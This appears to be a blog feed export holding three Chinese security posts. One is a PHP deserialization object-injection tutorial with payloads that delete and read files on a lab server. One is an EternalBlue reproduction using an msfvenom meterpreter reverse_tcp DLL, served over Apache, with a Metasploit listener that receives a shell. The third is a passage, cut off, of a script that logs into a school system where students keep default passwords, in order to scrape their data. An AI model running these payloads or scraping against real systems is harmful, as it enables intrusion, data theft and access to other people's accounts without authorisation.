class="line">$usr-&gt;PrintData();    </div><div class="line">     </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226152046329" alt=""></p>
<p>magic函数<strong>construct和</strong>destruct会在对象创建或者销毁时自动调用；<strong>sleep magic方法在一个对象被序列化的时候调用；</strong>wakeup magic方法在一个对象被反序列化的时候调用。在5.php中添加这几个magic函数的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">   </div><div class="line">class Test  </div><div class="line">&#123;  </div><div class="line">    public $variable = &apos;BUZZ&apos;;  </div><div class="line">    public $variable2 = &apos;OTHER&apos;;  </div><div class="line">   </div><div class="line">    public function PrintVariable()  </div><div class="line">    &#123;  </div><div class="line">        echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    public function __construct()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;__construct&lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    public function __destruct()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;__destruct&lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    public function __wakeup()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;__wakeup&lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    public function __sleep()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;__sleep&lt;br /&gt;&apos;;  </div><div class="line">   </div><div class="line">        return array(&apos;variable&apos;, &apos;variable2&apos;);  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">// 创建对象调用__construct</div><div class="line">   </div><div class="line">$obj = new Test();  </div><div class="line">   </div><div class="line">// 序列化对象调用__sleep  </div><div class="line">   </div><div class="line">$serialized = serialize($obj);  </div><div class="line">   </div><div class="line">// 输出序列化后的字符串  </div><div class="line">   </div><div class="line">print &apos;Serialized: &apos; . $serialized . &apos;&lt;br /&gt;&apos;;  </div><div class="line">   </div><div class="line">// 重建对象调用__wakeup  </div><div class="line">   </div><div class="line">$obj2 = unserialize($serialized);  </div><div class="line">   </div><div class="line">// 调用PintVariable输出数据 </div><div class="line">   </div><div class="line">$obj2-&gt;PrintVariable();  </div><div class="line">   </div><div class="line">// 脚本结束调用__destruct   </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226163434517" alt=""></p>
<p>现在我们了解序列化是如何工作的，但是我们如何利用它呢?有多种可能的方法，取决于应用程序、可用的类和magic函数。记住，序列化对象包含攻击者控制的对象值。你可能在Web应用程序源代码中找到一个定义<strong>wakeup或</strong>destruct的类，这些函数会影响Web应用程序。例如，我们可能会找到一个临时将日志存储到文件中的类。当销毁时对象可能不再需要日志文件并将其删除。把下面这段代码保存为logfile.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;?php   </div><div class="line">   </div><div class="line">class LogFile  </div><div class="line">&#123;  </div><div class="line">    // log文件名  </div><div class="line">   </div><div class="line">    public $filename = &apos;error.log&apos;;  </div><div class="line">   </div><div class="line">    // 储存日志文件  </div><div class="line">   </div><div class="line">    public function LogData($text)  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;Log some data: &apos; . $text . &apos;&lt;br /&gt;&apos;;  </div><div class="line">        file_put_contents($this-&gt;filename, $text, FILE_APPEND);  </div><div class="line">    &#125;  </div><div class="line">   </div><div class="line">    // 删除日志文件  </div><div class="line">   </div><div class="line">    public function __destruct()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;__destruct deletes &quot;&apos; . $this-&gt;filename . &apos;&quot; file. &lt;br /&gt;&apos;;  </div><div class="line">        unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;filename);  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>这是一个使用它的例子。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php    </div><div class="line">     </div><div class="line">include &apos;logfile.php&apos;;    </div><div class="line">     </div><div class="line">// 创建一个对象    </div><div class="line">     </div><div class="line">$obj = new LogFile();    </div><div class="line">     </div><div class="line">// 设置文件名和要储存的日志数据    </div><div class="line">     </div><div class="line">$obj-&gt;filename = &apos;somefile.log&apos;;    </div><div class="line">$obj-&gt;LogData(&apos;Test&apos;);    </div><div class="line">     </div><div class="line">// 脚本结束__destruct被调用somefile.log文件被删除  </div><div class="line">     </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>在其它脚本中我们可能找到一个unserialize的调用，并且参数是用户提供的。把下面这段代码保存为test.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">   </div><div class="line">include &apos;logfile.php&apos;;  </div><div class="line">   </div><div class="line">// ... 一些使用LogFile类的代码...  </div><div class="line">   </div><div class="line">// 简单的类定义  </div><div class="line">   </div><div class="line">class User  </div><div class="line">&#123;  </div><div class="line">    // 类数据  </div><div class="line">   </div><div class="line">    public $age = 0;  </div><div class="line">    public $name = &apos;&apos;;  </div><div class="line">   </div><div class="line">    // 输出数据  </div><div class="line">   </div><div class="line">    public function PrintData()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">// 重建用户输入的数据  </div><div class="line">   </div><div class="line">$usr = unserialize($_GET[&apos;usr_serialized&apos;]);  </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>创建利用代码111.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"></div><div class="line">include &apos;logfile.php&apos;;  </div><div class="line"></div><div class="line">$obj = new LogFile();  </div><div class="line">$obj-&gt;filename = &apos;1.php&apos;;  </div><div class="line">   </div><div class="line">echo serialize($obj) . &apos;&lt;br /&gt;&apos;;  </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226171240425" alt=""></p>
<p>访问<a href="http://192.168.153.138/test.php?usr_serialized=O:7:&quot;LogFile&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;}" target="_blank" rel="external">http://192.168.153.138/test.php?usr_serialized=O:7:&quot;LogFile&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;}</a></p>
<p><img src="http://img.blog.csdn.net/20161226171734880" alt=""></p>
<p>显示已经删除了1.php。验证一下，果然成功删除了。<br><img src="http://img.blog.csdn.net/20161226171852146" alt=""></p>
<p>这就是漏洞名称的由来：在变量可控并且进行了unserialize操作的地方注入序列化对象，实现代码执行或者其它坑爹的行为。先不谈 <strong>wakeup 和 </strong>destruct，还有一些很常见的注入点允许你利用这个类型的漏洞，一切都是取决于程序逻辑。举个例子，某用户类定义了一个<strong>toString为了让应用程序能够将类作为一个字符串输出(echo $obj)，而且其他类也可能定义了一个类允许</strong>toString读取某个文件。把下面这段代码保存为test.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">&lt;?php   </div><div class="line">   </div><div class="line">// … 一些include ...  </div><div class="line">   </div><div class="line">class FileClass  </div><div class="line">&#123;  </div><div class="line">    // 文件名  </div><div class="line">   </div><div class="line">    public $filename = &apos;error.log&apos;;  </div><div class="line">   </div><div class="line">    // 当对象被作为一个字符串会读取这个文件  </div><div class="line">   </div><div class="line">    public function __toString()  </div><div class="line">    &#123;  </div><div class="line">        return file_get_contents($this-&gt;filename);  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">// Main User class  </div><div class="line">   </div><div class="line">class User  </div><div class="line">&#123;  </div><div class="line">    // Class data  </div><div class="line">   </div><div class="line">    public $age = 0;  </div><div class="line">    public $name = &apos;&apos;;  </div><div class="line">   </div><div class="line">    // 允许对象作为一个字符串输出上面的data  </div><div class="line">   </div><div class="line">    public function __toString()  </div><div class="line">    &#123;  </div><div class="line">        return &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">// 用户可控  </div><div class="line">   </div><div class="line">$obj = unserialize($_GET[&apos;usr_serialized&apos;]);  </div><div class="line">   </div><div class="line">// 输出__toString  </div><div class="line">   </div><div class="line">echo $obj;  </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>访问<a href="http://192.168.153.138/test.php?usr_serialized=O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;}" target="_blank" rel="external">http://192.168.153.138/test.php?usr_serialized=O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;}</a></p>
<p><img src="http://img.blog.csdn.net/20161226172759524" alt=""></p>
<p>但是如果我们用序列化调用FileClass呢?先建立一个1.txt。</p>
<p><img src="http://img.blog.csdn.net/20161226181346046" alt=""></p>
<p>创建利用代码123.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"> </div><div class="line">include &apos;test.php&apos;;  </div><div class="line">$fileobj = new FileClass();  </div><div class="line">$fileobj-&gt;filename = &apos;1.txt&apos;;  </div><div class="line">   </div><div class="line">echo serialize($fileobj);  </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226174603949" alt=""></p>
<p>访问<a href="http://192.168.153.138/test.php?usr_serialized=O:9:&quot;FileClass&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;}" target="_blank" rel="external">http://192.168.153.138/test.php?usr_serialized=O:9:&quot;FileClass&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;}</a></p>
<p><img src="http://img.blog.csdn.net/20161226174705550" alt=""></p>
<p>成功显示了文本内容。也可以使用其他magic函数：如果对象将调用一个不存在的函数<strong>call将被调用；如果对象试图访问不存在的类变量</strong>get和__set将被调用。但是利用这种漏洞并不局限于magic函数，在普通的函数上也可以采取相同的思路。例如User类可能定义一个get方法来查找和打印一些用户数据，但是其他类可能定义一个从数据库获取数据的get方法，这从而会导致SQL注入漏洞。set或write方法会将数据写入任意文件，可以利用它获得远程代码执行。唯一的技术问题是注入点可用的类，但是一些框架或脚本具有自动加载的功能。最大的问题在于人：理解应用程序以能够利用这种类型的漏洞，因为它可能需要大量的时间来阅读和理解代码。</p>
<p>原文链接：<a href="http://blog.csdn.net/qq_32400847/article/details/53873275" target="_blank" rel="external">http://blog.csdn.net/qq_32400847/article/details/53873275</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>方程式 0day Eternalblue复现</title>
    <link href="http://uknowsec.cn/posts/notes/%E6%96%B9%E7%A8%8B%E5%BC%8F-0day-Eternalblue%E5%A4%8D%E7%8E%B0.html"/>
    <id>http://uknowsec.cn/posts/notes/方程式-0day-Eternalblue复现.html</id>
    <published>2017-05-26T02:19:34.000Z</published>
    <updated>2017-05-26T02:57:26.682Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨天去学长公司了，在公司呆了一下午。其间学长的同事让我复现下方程式Eternalblue，但是由于我没有带电脑所以没有在那边进行复现。Eternalblue之前我是有复现过的，那时候是用吐司上别人发的MSF集成的脚本。但是好像是成功了，回来打开KALI还看到之前的成功记录。这次再次进行一次复现，在这个过程中，一开始我是按照学长同事给的freebuf上的一篇文章来的，但是我最初下载的Empire是最新版的，然后在配置listeners的过程中出现错误，不能配置。无奈在他人的提醒下下载了1.6版本但是由于之前安装了最新版的问题，1.6无法安装。所以只能直接用msf进行监听了。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">攻击机 ： 10.15.17.215</div><div class="line">win7 32bit 旗舰版</div><div class="line">python-2.6.6.msi</div><div class="line">https://www.python.org/download/releases/2.6.6/</div><div class="line">pywin32-221.win32-py2.6.exe</div><div class="line">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526102843.jpg" alt=""></p>
<h3 id="监听机"><a href="#监听机" class="headerlink" title="监听机"></a>监听机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">监听机 ： 10.15.198.65</div><div class="line">KALI</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101141.jpg" alt=""></p>
<h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">靶机 ： 10.15.251.226</div><div class="line">win 64bit en 旗舰版</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526100922.jpg" alt=""></p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="生成DLL文件"><a href="#生成DLL文件" class="headerlink" title="生成DLL文件"></a>生成DLL文件</h3><ul>
<li><p>在KALI下生成s.dll到apache目录下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.15.198.65 LPORT=5555 -f dll &gt; /var/www/html/s.dll</div></pre></td></tr></table></figure>
</li>
<li><p>启动apache服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service apache2 start</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101041.jpg" alt=""></p>
<h3 id="设置监听"><a href="#设置监听" class="headerlink" title="设置监听"></a>设置监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use exploit/mulit/handler</div><div class="line">set LHOST 10.15.198.65</div><div class="line">set LPORT 5555</div><div class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">exploit</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101328.jpg" alt=""></p>
<h3 id="配置攻击脚本"><a href="#配置攻击脚本" class="headerlink" title="配置攻击脚本"></a>配置攻击脚本</h3><ul>
<li>运行fb.py 配置攻击脚本</li>
<li>访问KALI的web服务器下载s.dll文件复制到C盘目录</li>
<li>加载DLL</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101230.jpg" alt=""></p>
<h3 id="操作监听机"><a href="#操作监听机" class="headerlink" title="操作监听机"></a>操作监听机</h3><ul>
<li>Msf里成功收到一个shell</li>
<li>getuid</li>
<li>ipconfig</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101328.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101109.jpg" alt=""></p>
<h2 id="之前的复现图"><a href="#之前的复现图" class="headerlink" title="之前的复现图"></a>之前的复现图</h2><p>附上之前利用msf集成exp脚本测试图。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/_ZC1FX3$WP%5DCML2JTF8MMTT.png" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/~X%7D5U%7D5VQO@OPK%5BN$5~_Y%5DG.png" alt=""></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>昨天回来后休息了一会，然后才开始复现的，等我把环境配置好的时候已经断网了。Empire最新版无法配置listeners的问题一直没有解决。早上下载1.6版本有出现了错误，需要删除最新版。但是Empire是利用.sh安装的，想要卸载干净不是那么简单的。再加上我的KALI没有快照不能还原，无奈只能直接利用MSF，不能按照freebuf上的文章进行复现。然后自己的电脑也比较渣，开三个虚拟机一卡一卡的，陆陆续续才完成这个复现过程。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Python编程实践学习--模拟登录爬取信息</title>
    <link href="http://uknowsec.cn/posts/notes/python%E7%BC%96%E7%A8%8B%E5%AE%9E%E8%B7%B5%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E7%88%AC%E5%8F%96%E4%BF%A1%E6%81%AF.html"/>
    <id>http://uknowsec.cn/posts/notes/python编程实践学习-模拟登录爬取信息.html</id>
    <published>2017-05-12T07:15:52.000Z</published>
    <updated>2017-05-12T09:58:08.397Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在安全牛看《简单学python安全》这套视频教材，然后自己也想写个小东西，恰巧学习的一个信息系统，同学们的账号密码都是默认的，而且没有验证码，相对简单。所以就开始了这个小脚本的编写历程。这个过程中遇到了不少问题，请教了学长，在学长的帮助和指导下完成。在此回顾总结下这次过程。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>一开始自己抓包分析的时候，出现了一些问题。登录过程分析得不够严谨，以致于模拟登录的时候出现不能登录上去的问题，后来学长帮我分析了下。原来这个模拟登录过程需要两个POST请求过程，而在这个过程中之前我使用的是urllib这个库来模拟登录，在学长的提示下使用request这个相较于urllib先进的库</p>
<h4 id="第一个POST包"><a href="#第一个POST包" class="headerlink" title="第一个POST包"></a>第一个POST包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">POST /renzheng.jsp HTTP/1.1</div><div class="line">Host: xxxx.xxxx.edu.cn</div><div class="line">Content-Length: 142</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://xxxx.xxxx.edu.cn</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Referer: http://xxxx.xxxx.edu.cn</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Cookie: UM_distinctid=15b7be26085454-0504ed9f0e367d-3c365402-100200-15b7be26086832; JSESSIONID=213C06E58934DCED50E4E479858CB055</div><div class="line">Connection: close</div><div class="line"></div><div class="line">displayName=&amp;displayPasswd=&amp;select=2&amp;submit.x=36&amp;submit.y=14&amp;operType=911&amp;random_form=-1048366953725273893&amp;userName=xxxxx&amp;passwd=xxxxx</div></pre></td></tr></table></figure>
<ul>
<li>从第一个包可以看出PostData部分由9各部分组成其中：</li>
<li>displayName、displayPasswd默认是空的</li>
<li>select、submit.x、submit.y这三个参数中，select是用户类型，如果是教师用户select=1,如果是学生用户select=2。submit.x、submit.y分别代表鼠标点击的坐标</li>
<li>operType、random_form这两个个参数中，operType默认为911，random_form是一个随机数字串</li>
<li>userName、passwd这两个参数是账号密码，明文传输</li>
</ul>
<h4 id="第二个POST包"><a href="#第二个POST包" class="headerlink" title="第二个POST包"></a>第二个POST包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">POST /servlet/adminservlet HTTP/1.1</div><div class="line">Host: xxxx.xxxx.edu.cn</div><div class="line">Content-Length: 65</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://xxxx.xxxx.edu.cn</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Referer: http://xxxx.xxxx.edu.cn/renzheng.jsp</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Cookie: UM_distinctid=15b7be26085454-0504ed9f0e367d-3c365402-100200-15b7be26086832; JSESSIONID=213C06E58934DCED50E4E479858CB055</div><div class="line">Connection: close</div><div class="line"></div><div class="line">isValidate=false&amp;userName=xxxxx&amp;passwd=xxxxx&amp;operType=911</div></pre></td></tr></table></figure>
<ul>
<li>看Referer可以看出这个包是由第一个包的页面跳转过来的</li>
<li>userName、passwd这两个参数是账号密码，明文传输</li>
<li>isValidate默认为false</li>
<li>operType默认为911</li>
</ul>
<h4 id="爬取页面GET包"><a href="#爬取页面GET包" class="headerlink" title="爬取页面GET包"></a>爬取页面GET包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /student/studentInfo.jsp?userName=xxxx&amp;passwd=xxxxx HTTP/1.1</div><div class="line">Host: xxxx.xxxx.edu.cn</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Referer: http://xxxx.xxxx.edu.cn/servlet/adminservlet</div><div class="line">Accept-Encoding: gzip, deflate, sdch</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Cookie: UM_distinctid=15b7be26085454-0504ed9f0e367d-3c365402-100200-15b7be26086832; JSESSIONID=213C06E58934DCED50E4E479858CB055</div><div class="line">Connection: close</div></pre></td></tr></table></figure>
<ul>
<li>看Referer可以看出这个包是由第二个包的页面跳转过来的</li>
<li>userName、passwd这两个参数是账号密码，明文传输</li>
</ul>
<h3 id="模拟构造请求包"><a href="#模拟构造请求包" class="headerlink" title="模拟构造请求包"></a>模拟构造请求包</h3><p>在写Python代码的过程我尝试着用了面向对象的过程，把相关变量定义为私有变量，在模拟登录的过程中使用到了Requests模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">__header = &#123;</div><div class="line">			&apos;User-Agent&apos; : &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&apos;,</div><div class="line">			&apos;Content-Type&apos;:&apos;application/x-www-form-urlencoded&apos;,</div><div class="line">			&apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;,</div><div class="line">			&apos;Referer&apos;: &apos;http://xxxx.xxxx.edu.cn/&apos;,</div><div class="line">			&apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,</div><div class="line">			&apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8&apos;</div><div class="line">	&#125;</div><div class="line">__data1 = &#123;</div><div class="line">			&apos;displayName&apos; : &apos;&apos;,</div><div class="line">	  		&apos;displayPasswd&apos; : &apos;&apos;,</div><div class="line">	  		&apos;select&apos;: 